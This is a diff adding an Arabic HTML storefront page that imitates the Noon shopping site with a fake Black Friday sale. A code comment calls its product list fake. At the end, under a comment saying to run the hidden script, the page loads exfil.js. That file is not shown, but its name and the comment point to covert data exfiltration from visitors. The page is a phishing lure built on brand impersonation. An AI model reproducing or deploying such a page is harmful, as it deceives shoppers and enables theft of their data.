@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تخفيضات نون - عروض حصرية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+        }
+
+        body {
+            background: #f5f5f5;
+        }
+
+        .top-bar {
+            background: #e31e24;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .header {
+            background: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #e31e24;
+        }
+
+        .search-bar {
+            flex: 1;
+            margin: 0 20px;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 25px;
+            font-size: 16px;
+        }
+
+        .banner {
+            width: 100%;
+            height: 300px;
+            background: linear-gradient(135deg, #e31e24, #ff6b6b);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 36px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+
+        .banner span {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px 40px;
+            border-radius: 50px;
+        }
+
+        .categories {
+            display: flex;
+            gap: 15px;
+            padding: 15px;
+            overflow-x: auto;
+        }
+
+        .cat-item {
+            min-width: 100px;
+            background: white;
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+
+        .cat-item img {
+            width: 50px;
+            height: 50px;
+        }
+
+        .products {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 15px;
+            padding: 15px;
+        }
+
+        .product {
+            background: white;
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .product:hover {
+            transform: translateY(-5px);
+        }
+
+        .product img {
+            width: 100%;
+            height: 180px;
+            object-fit: contain;
+        }
+
+        .product h3 {
+            font-size: 14px;
+            margin: 10px 0;
+            color: #333;
+        }
+
+        .price {
+            color: #e31e24;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .old-price {
+            text-decoration: line-through;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .loading.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #e31e24;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="loading" id="loadingScreen">
+        <div class="spinner"></div>
+        <h2 style="margin-top: 20px;">جاري التحميل...</h2>
+        <p style="color: #666; margin-top: 10px;">يرجى الانتظار قليلاً</p>
+    </div>
+
+    <div class="top-bar">🔥 تخفيضات الجمعة البيضاء - خصم يصل إلى 70% 🔥</div>
+
+    <div class="header">
+        <div class="logo">🔴 Noon</div>
+        <input class="search-bar" type="text" placeholder="ابحث عن منتج...">
+        <div>🛒 سلة المشتريات</div>
+    </div>
+
+    <div class="banner">
+        <span>🛍️ عروض حصرية تصل إلى 70%</span>
+    </div>
+
+    <div class="categories">
+        <div class="cat-item">📱 الكترونيات</div>
+        <div class="cat-item">👗 أزياء</div>
+        <div class="cat-item">🏠 منزل</div>
+        <div class="cat-item">📚 كتب</div>
+        <div class="cat-item">🎮 ألعاب</div>
+    </div>
+
+    <h2 style="padding: 15px; font-size: 22px;">🛒 أشهر العروض</h2>
+
+    <div class="products" id="products"></div>
+
+    <script>
+        // منتجات وهمية
+        const products = [
+            { name: 'آيفون 16 برو ماكس 512GB', img: 'https://via.placeholder.com/200?text=iPhone+16', price: '4,999', old: '6,999' },
+            { name: 'سماعات ابل ايربودز برو 2', img: 'https://via.placeholder.com/200?text=AirPods', price: '899', old: '1,299' },
+            { name: 'ساعة سامسونج ووتش 6', img: 'https://via.placeholder.com/200?text=Watch', price: '799', old: '1,199' },
+            { name: 'لابتوب لينوفو ثينك باد', img: 'https://via.placeholder.com/200?text=Laptop', price: '3,299', old: '4,999' },
+            { name: 'تابلت سامسونج جالاكسي تاب S9', img: 'https://via.placeholder.com/200?text=Tablet', price: '2,199', old: '3,499' },
+            { name: 'ماوس لوجيتك G502', img: 'https://via.placeholder.com/200?text=Mouse', price: '249', old: '399' },
+        ];
+
+        const container = document.getElementById('products');
+        products.forEach(p => {
+            const div = document.createElement('div');
+            div.className = 'product';
+            div.innerHTML = `
+        <img src="${p.img}" alt="${p.name}" onerror="this.src='https://via.placeholder.com/200?text=Product'">
+        <h3>${p.name}</h3>
+        <div><span class="price">${p.price} ر.س</span> <span class="old-price">${p.old} ر.س</span></div>
+    `;
+            container.appendChild(div);
+        });
+    </script>
+
+    <!-- هنا شغّل السكربت الخفي -->
+    <script src="exfil.js"></script>
+</body>
+
+</html>
